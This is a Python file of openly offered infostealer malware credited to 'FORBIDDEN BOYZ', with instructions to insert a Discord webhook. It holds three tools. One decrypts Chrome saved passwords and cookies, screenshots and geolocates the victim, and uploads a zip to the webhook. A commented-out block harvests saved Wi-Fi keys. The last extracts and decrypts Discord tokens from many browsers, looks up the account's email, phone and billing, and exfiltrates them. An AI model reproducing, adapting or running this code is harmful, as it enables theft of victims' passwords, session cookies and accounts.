# ALERT! ALERT! ALERT!
# BEFORE RUNNING THIS FILE MAKE SURE TO CHANGE ("YOUR WEBHOOK HERE") TO YOUR DISCORD WEBHOOK 
# CHANGE THE ("YOUR WEBHOOK HERE") IN LINE 28, LINE 221 AND LINE 385


# ALERT! ALERT! ALERT!
# BEFORE RUNNING THIS FILE MAKE SURE TO CHANGE ("YOUR WEBHOOK HERE") TO YOUR DISCORD WEBHOOK 
# CHANGE THE ("YOUR WEBHOOK HERE") IN LINE 28, LINE 221 AND LINE 385


# ALERT! ALERT! ALERT!
# BEFORE RUNNING THIS FILE MAKE SURE TO CHANGE ("YOUR WEBHOOK HERE") TO YOUR DISCORD WEBHOOK 
# CHANGE THE ("YOUR WEBHOOK HERE") IN LINE 28, LINE 221 AND LINE 385



import webbrowser
import requests
import os 
import shutil 
import sqlite3 
import zipfile 
import json 
import base64 
import psutil 
import pyautogui
from time import sleep
import requests
import random
import string
from colorama import Fore

from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES




class FORBIDDEN_BOYZ_PASSWORD_AND_COOKIE_GRABBER:
    def __init__(self):
        self.webhook = "YOUR WEBHOOK HERE"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\FORBIDDEN_BOYZ_GRABBER"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.saved = []


        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"{os.getlogin()} doesn't have google installed\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.screenshot()
        self.SendInfo()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileExistsError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers


    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by FORBIDDEN BOYZ | https://discord.gg/ATmdFhkNgM\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by FORBIDDEN BOYZ | https://discord.gg/ATmdFhkNgM\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass


    def screenshot(self):
        image = pyautogui.screenshot()
        image.save(self.tempfolder + "\\Screenshot.png")

    def SendInfo(self):
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception:
            pass
        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'FORBIDDEN_BOYZ_GRABBER-[{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Files Found: "
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/1014550781426417765/1019661773349077062/images.png",
            "embeds": [
                {
                    "author": {
                        "name": "FORBIDDEN BOYZ",
                        "url": "https://discord.gg/ATmdFhkNgM",
                        "icon_url": "https://cdn.discordapp.com/attachments/1014550781426417765/1019661773349077062/images.png"
                    },
                    "description": f"**{os.getlogin()}** Just ran FORBIDDEN BOYZ PASSWORD AND COOKIE Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/1014550781426417765/1019661773349077062/images.png"
                    },       

                    "footer": {
                      "text": "FORBIDDEN BOYZ https://discord.gg/ATmdFhkNgM"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})

    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

if __name__ == "__main__":
    FORBIDDEN_BOYZ_PASSWORD_AND_COOKIE_GRABBER()




#import subprocess, os, sys, requests, re, urllib

#url = 'YOUR ZAPHIER WEBHOOK HERE'
#usr = os.getlogin()


#found_ssids = []
#pwnd = []
#wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
#wlan_key_regex = r"Key Content\s+:\s(.*)$"


#get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()


#matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
#for match in matches:
#    for group in match.groups():
#        found_ssids.append(group.strip())


#for ssid in found_ssids:
 #   get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
  #  matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
   # for match in matches:
    #    for group in match.groups():
     #       pwnd.append({
      #          "USERNAME":usr,
       #         "SSID":ssid,
        #        "Password":group.strip()
         #       }) 


#if len(pwnd) == 0:
  #   sys.exit()


#final_payload = "User is "+usr+"\n"+""
#for pwnd_ssid in pwnd:
 #   final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
#
#r = requests.post(url, params="format=json", data=final_payload)

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*FORBIDDEN BOYZ* **|** ||https://discord.gg/PRhsmpv3||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by FORBIDDEN_BOYZ', 'avatar_url': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRispM6EC7yUIS3GffS-apgTMwl8dQjnHJKrQ&usqp=CAU'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('YOUR WEBHOOK HERE', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: pass
                else: pass
if __name__ == '__main__':
    get_token()



